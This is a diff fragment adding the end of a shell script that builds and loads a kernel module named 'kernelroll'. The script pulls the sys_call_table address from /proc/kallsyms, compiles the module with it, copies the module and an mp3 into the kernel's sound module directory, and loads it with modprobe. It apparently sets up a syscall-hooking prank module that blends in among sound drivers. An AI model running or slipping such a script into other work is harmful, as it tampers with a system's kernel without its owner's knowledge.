@@ -1,0 +1,12 @@
+EOF
+
+apt-get install -y build-essential linux-headers-generic
+
+SYS_CALL_TABLE=$(awk ' $0 ~ /R sys_call_table/ { print $1 } ' /proc/kallsyms)
+
+make -C "$TEMP" KCFLAGS+=-DSYS_CALL_TABLE=0x"$SYS_CALL_TABLE"
+
+SOUND=/lib/modules/"$(uname -r)"/kernel/sound
+cp "$TEMP"/kernelroll.{ko,mp3} "$SOUND"
+depmod -A
+modprobe kernelroll rollfile="$SOUND"/kernelroll.mp3
